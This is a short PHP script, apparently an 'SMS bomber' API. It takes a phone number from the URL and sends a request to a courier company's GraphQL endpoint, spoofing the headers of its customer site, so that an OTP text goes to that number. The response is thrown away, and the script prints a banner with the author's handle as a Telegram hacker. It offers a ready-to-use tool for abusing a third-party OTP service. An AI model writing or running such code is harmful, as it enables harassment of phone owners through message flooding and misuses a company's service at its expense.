<?php
// Enable error reporting for debugging
error_reporting(E_ALL);
ini_set('display_errors', 1);

// Get the phone parameter from the URL
$phone = isset($_GET['phone']) ? $_GET['phone'] : '';

// Format the phone number to an 11-digit string
$phone = preg_replace('/\D/', '', $phone);

// Validate that the phone number is 11 digits and starts with 0
if (strlen($phone) !== 11 || $phone[0] !== '0') {
    die('Invalid phone number. It must be an 11-digit number starting with 0.');
}

// API endpoint
$url = 'https://api-gateway.sundarbancourierltd.com/graphql';

// Prepare the request payload
$data = [
    'operationName' => 'CreateAccessToken',
    'variables' => [
        'accessTokenFilter' => [
            'userName' => $phone // Use the formatted phone number
        ]
    ],
    'query' => 'mutation CreateAccessToken($accessTokenFilter: AccessTokenInput!) {
                  createAccessToken(accessTokenFilter: $accessTokenFilter) {
                    message
                    statusCode
                    result {
                      phone
                      otpCounter
                      __typename
                    }
                    __typename
                  }
                }'
];

// Initialize cURL session
$ch = curl_init($url);

// Set cURL options
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_POST, true);
curl_setopt($ch, CURLOPT_HTTPHEADER, [
    'accept: */*',
    'accept-language: en-US,en;q=0.9,bn;q=0.8',
    'authorization:', // Authorization header (leave empty if not needed)
    'content-type: application/json',
    'origin: https://customer.sundarbancourierltd.com',
    'referer: https://customer.sundarbancourierltd.com/',
    'sec-ch-ua: "Chromium";v="124", "Google Chrome";v="124", "Not-A.Brand";v="99"',
    'sec-ch-ua-mobile: ?0',
    'sec-ch-ua-platform: "Windows"',
    'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36'
]);
curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode($data));

// Execute the request
$response = curl_exec($ch);

// Check for errors and print the custom success message
if ($response === false) {
    echo 'Curl error: ' . curl_error($ch);
} else {
    // Output success response
    echo "Api Owner : Mɾ. Jҽɾɾყ 😈<br>";
    echo "Telegram : t.me/Mr_Jerry_Hacker";
}

// Close the cURL session
curl_close($ch);
?>
